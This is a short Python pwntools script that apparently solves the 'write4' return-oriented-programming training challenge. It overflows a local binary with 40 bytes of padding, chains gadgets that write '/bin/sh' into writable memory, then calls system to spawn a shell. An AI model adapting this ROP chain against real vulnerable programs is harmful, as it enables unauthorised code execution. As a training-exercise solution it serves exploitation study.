#!/bin/python3

from pwn import *

pop_r14_pop_r15 = p64(0x0000000000400890)
gotplt = p64(0x00601000)
binsh = b"/bin/sh\x00"
mov_r15_to_r14 = p64(0x0000000000400820)
sysfunc = p64(0x4005e0)
pop_rdi = p64(0x0000000000400893)

payload = b"A"*40
payload += pop_r14_pop_r15 
payload += gotplt
payload += binsh
payload += mov_r15_to_r14
payload += pop_rdi
payload += gotplt
payload += sysfunc

#print(payload)

io = process("./write4")
io.recvrepeat(2)
io.sendline(payload)
io.interactive()
